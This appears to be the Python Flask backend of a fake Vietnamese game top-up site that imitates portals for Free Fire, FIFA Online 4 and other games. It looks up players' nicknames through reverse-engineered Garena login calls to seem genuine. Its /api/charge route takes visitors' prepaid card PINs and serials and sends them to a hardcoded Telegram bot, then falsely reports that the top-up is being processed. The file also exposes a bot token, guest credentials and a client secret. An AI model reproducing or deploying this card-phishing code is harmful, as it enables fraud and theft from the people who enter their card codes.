#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from flask import Flask, send_file, request, jsonify
import hashlib
import requests
import json
import base64
import time
import random
from datetime import datetime
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__, static_folder='static', static_url_path='/static')

# ==================== CONSTANTS ====================
AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

GUEST_ACCOUNT = "uid=7154064913&password=KHANH_JAHID_X_EMPIRE_3FOsgUeU"

# ==================== TELEGRAM CONFIG ====================
TELEGRAM_BOT_TOKEN = "8933130310:AAHmGfo6qLacEMNZjIIO7EBmbwrSi0Q5N7U"  # THAY BẰNG TOKEN CỦA MÀY
TELEGRAM_CHAT_ID = "8003369858"  # THAY BẰNG CHAT ID CỦA MÀY

# ==================== CRYPTO HELPERS ====================
def pad(data, block_size=16):
    padding_len = block_size - (len(data) % block_size)
    return data + bytes([padding_len] * padding_len)

def unpad(data):
    padding_len = data[-1]
    return data[:-padding_len]

def aes_encrypt(data: bytes, key=AES_KEY, iv=AES_IV) -> bytes:
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(pad(data)) + encryptor.finalize()

def aes_decrypt(data: bytes, key=AES_KEY, iv=AES_IV) -> bytes:
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    return unpad(decryptor.update(data) + decryptor.finalize())

def parse_proto(data: bytes) -> dict:
    result = {}
    idx = 0
    while idx < len(data):
        try:
            tag = data[idx]; idx += 1
            fn = tag >> 3; wt = tag & 0x07
            if wt == 0:
                val = 0; shift = 0
                while idx < len(data):
                    b = data[idx]; idx += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                result[fn] = val
            elif wt == 2:
                ln = 0; shift = 0
                while idx < len(data):
                    b = data[idx]; idx += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                result[fn] = data[idx:idx+ln]; idx += ln
            elif wt == 1:
                idx += 8
            elif wt == 5:
                idx += 4
            else: break
        except: break
    return result

def decode_jwt(token: str) -> dict:
    parts = token.split(".")
    if len(parts) < 2: return {}
    p = parts[1] + "=" * (-len(parts[1]) % 4)
    try:
        return json.loads(base64.urlsafe_b64decode(p).decode())
    except:
        return {}

# ==================== PROTOBUF HELPERS ====================
def _varint(v):
    r = bytearray()
    while v > 0x7F:
        r.append((v & 0x7F) | 0x80)
        v >>= 7
    r.append(v)
    return bytes(r)

def _str_field(f, v):
    if isinstance(v, str):
        v = v.encode()
    return _varint((f << 3) | 2) + _varint(len(v)) + v

def build_login_payload(open_id: str, access_token: str, platform: int) -> bytes:
    now = str(datetime.now())[:19]
    pl = bytearray()
    pl += _str_field(3, now)
    pl += _str_field(22, open_id)
    pl += _str_field(23, str(platform))
    pl += _str_field(29, access_token)
    pl += _str_field(99, str(platform))
    return bytes(pl)

# ==================== GARENA API HELPERS ====================
def get_lookup_access_token(account: str):
    url = "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant"
    payload = account + "&response_type=token&client_type=2&client_secret=2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3&client_id=100067"
    headers = {
        'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; CPH2095 Build/RKQ1.211119.001)",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/x-www-form-urlencoded"
    }
    resp = requests.post(url, data=payload, headers=headers)
    data = resp.json()
    return data.get("access_token", "0"), data.get("open_id", "0")

def inspect_token(access_token: str):
    url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
    h = {"Connection": "close", "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"}
    r = requests.get(url, headers=h, timeout=10)
    d = r.json()
    if 'error' in d:
        raise Exception(f"Token lỗi: {d.get('error')}")
    return d.get('open_id'), int(d.get('platform', 8))

def do_major_login(open_id: str, access_token: str, platform: int):
    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        'X-Unity-Version': '2018.4.11f1',
        'ReleaseVersion': "OB54",
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-GA': 'v1 1',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
        'Host': 'loginbp.ggpolarbear.com',
        'Connection': 'Keep-Alive'
    }
    enc = aes_encrypt(build_login_payload(open_id, access_token, platform))
    resp = requests.post(url, headers=headers, data=enc, verify=False, timeout=10)
    if resp.status_code != 200:
        raise Exception(f"MajorLogin thất bại HTTP {resp.status_code}")
    
    content = resp.content
    for data_to_parse in [content]:
        if not data_to_parse: continue
        parsed = parse_proto(data_to_parse)
        token = parsed.get(8)
        if token:
            if isinstance(token, bytes): token = token.decode('utf-8', 'ignore')
            return token
    raise Exception("Không parse được JWT từ MajorLogin")

cached_lookup_tokens = {}

def get_lookup_token_info(region: str):
    info = cached_lookup_tokens.get(region)
    if info and time.time() < info['expires_at']:
        return info['token'], info['server_url']

    access_token, _ = get_lookup_access_token(GUEST_ACCOUNT)
    open_id, platform = inspect_token(access_token)

    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        'X-Unity-Version': '2018.4.11f1',
        'ReleaseVersion': "OB54",
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-GA': 'v1 1',
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
        'Host': 'loginbp.ggpolarbear.com',
        'Connection': 'Keep-Alive'
    }
    enc = aes_encrypt(build_login_payload(open_id, access_token, platform))
    resp = requests.post(url, headers=headers, data=enc, verify=False, timeout=10)

    if resp.status_code != 200:
        raise Exception(f"MajorLogin failed: {resp.status_code}")

    content = resp.content
    jwt_token = None
    server_url = None

    parsed = parse_proto(content)
    token = parsed.get(8)
    if token:
        if isinstance(token, bytes): token = token.decode('utf-8', 'ignore')
        jwt_token = token
        host = parsed.get(10)
        if isinstance(host, bytes): host = host.decode('utf-8', 'ignore')
        server_url = host

    if not jwt_token:
        raise Exception("Không parse được JWT từ MajorLogin")

    cached_lookup_tokens[region] = {
        'token': f"Bearer {jwt_token}",
        'server_url': server_url,
        'expires_at': time.time() + 25200
    }
    return cached_lookup_tokens[region]['token'], server_url

# Import protobuf
import main_pb2
import AccountPersonalShow_pb2
from google.protobuf import json_format

# ==================== TELEGRAM HELPER ====================
def send_telegram_message(text):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': text,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except:
        return False

def send_telegram_card(type_val, pin, serial, amount, username, game):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""
<b>💳 THẺ VỪA NẠP</b>
─────────────────
<b>🎮 Game:</b> {game}
<b>👤 Tài khoản:</b> {username}
<b>📌 Loại thẻ:</b> {type_val}
<b>💵 Mệnh giá:</b> {amount}đ
<b>🔢 Mã thẻ:</b> <code>{pin}</code>
<b>🔢 Serial:</b> <code>{serial}</code>
─────────────────
<b>⏰ Thời gian:</b> {now}
    """
    return send_telegram_message(message.strip())

# ==================== ROUTES ====================

@app.route('/')
def index():
    return send_file('index.html')

@app.route('/app/<int:game_id>/buy/<int:card_type>')
def game_page(game_id, card_type):
    game_mapping = {
        10010: 'Napso.html',
        10020: 'FifaOnline4.html',
        10030: 'FifaOnline4m.html',
        10040: 'Builda.html',
        10050: 'Freefire.html',
        10060: 'Caithe.html',
        10070: 'Blade.html',
    }
    if game_id not in game_mapping:
        return "Game not found", 404
    return send_file(game_mapping[game_id])

# ==================== API: CHECK UID ====================

@app.route('/api/get_nickname', methods=['POST'])
def get_nickname_by_uid():
    try:
        data = request.json
        uid = data.get('uid', '').strip()

        if not uid or not uid.isdigit() or len(uid) < 8:
            return jsonify({'success': False, 'error': 'UID không hợp lệ'})

        token, server = get_lookup_token_info('VN')

        if not server or server == "0":
            return jsonify({'success': False, 'error': 'Không thể lấy token tra cứu'})

        if not server.startswith("http://") and not server.startswith("https://"):
            server = f"https://{server}"

        req = main_pb2.GetPlayerPersonalShow()
        json_format.ParseDict({'a': int(uid), 'b': 7}, req)
        proto_bytes = req.SerializeToString()
        data_enc = aes_encrypt(proto_bytes)

        headers = {
            'User-Agent': "Dalvik/2.1.0 (Linux; U; Android 13; CPH2095 Build/RKQ1.211119.001)",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/octet-stream",
            'Expect': "100-continue",
            'Authorization': token,
            'X-Unity-Version': "2018.4.11f1",
            'X-GA': "v1 1",
            'ReleaseVersion': "OB54"
        }

        full_url = server.rstrip("/") + "/GetPlayerPersonalShow"
        resp = requests.post(full_url, data=data_enc, headers=headers, timeout=15)

        if resp.status_code != 200:
            return jsonify({'success': False, 'error': f'Lỗi API: {resp.status_code}'})

        info_pb = AccountPersonalShow_pb2.AccountPersonalShowInfo()
        info_pb.ParseFromString(resp.content)
        data_dict = json_format.MessageToDict(info_pb)

        nickname = data_dict.get('basicInfo', {}).get('nickname', '')

        if not nickname:
            return jsonify({'success': False, 'error': 'Không tìm thấy tên nhân vật'})

        return jsonify({'success': True, 'nickname': nickname, 'uid': uid})

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== API: NẠP THẺ ====================

@app.route('/api/charge', methods=['POST'])
def charge():
    try:
        data = request.json
        
        type_val = data.get('type', 'Không xác định')
        pin = data.get('pin', '')
        serial = data.get('serial', '')
        amount = data.get('amount', '')
        username = data.get('username', '')
        type_game = data.get('typeGame', 'free_fire')
        
        if not pin or not serial:
            return jsonify({
                'status': False,
                'message': '⚠️ Vui lòng nhập đầy đủ mã thẻ và serial!'
            })
        
        game_names = {
            'free_fire': 'Free Fire',
            'lien_quan': 'Liên Quân Mobile',
            'builda': 'Builda',
            'nap_so': 'Nạp Sò',
            'fifa_online4': 'FIFA Online 4 (VN)',
            'fifa_online4m': 'FIFA Online 4 M VN',
            'cai_the_tranh_hung': 'Cái Thế Tranh Hùng',
            'blade_and_soul': 'Blade and Soul'
        }
        game_name = game_names.get(type_game, 'Free Fire')
        
        request_id = random.randint(100000, 999999)
        
        success = send_telegram_card(
            type_val=type_val,
            pin=pin,
            serial=serial,
            amount=amount,
            username=username,
            game=game_name
        )
        
        if success:
            return jsonify({
                'status': True,
                'message': f'✅ Đã gửi thẻ thành công! Mã đơn: #{request_id}\nVui lòng chờ admin xử lý trong vài phút.'
            })
        else:
            return jsonify({
                'status': False,
                'message': '❌ Lỗi gửi thông tin đến Telegram. Vui lòng thử lại sau!'
            })
            
    except Exception as e:
        return jsonify({
            'status': False,
            'message': f'❌ Lỗi: {str(e)}'
        })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)